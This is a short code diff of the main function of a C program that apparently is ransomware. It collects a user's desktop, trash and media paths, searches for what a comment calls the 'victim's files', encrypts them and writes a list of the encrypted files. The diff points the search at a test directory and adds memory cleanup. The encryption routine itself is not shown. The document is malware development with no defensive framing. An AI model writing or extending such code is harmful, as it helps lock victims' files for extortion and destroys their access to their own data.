@@ -20,13 +20,15 @@ int main(){
     char * username = get_username();
     char * trash = get_trash_path(home);
     char * media = get_media_path(username);
+    char * test_path = get_test_path(desktop);
 
-	  // finding all victim's files
-    find_files(&files, desktop);
+	  /* finding all victim's files */
+    find_files(&files, test_path);
+    //find_files(&files, desktop);
     //find_files(&files, trash);
     //find_files(&files, media);
 
-    // start encryption
+    /* start encryption */
     encrypt_files(files, &encrypted, &not_encrypted);
     save_into_file_encrypted_list(encrypted, desktop);
     //destroy(&encrypted);
@@ -35,6 +37,14 @@ int main(){
     //print(encrypted);
     //destroy(&files);
     //destroy_encrypted_list(&encrypted);
+
+    /* Free the memory */
+    free(home);
+    free(desktop);
+    free(username);
+    free(trash);
+    free(media);
+    free(test_path);
 
     return 0;
 }
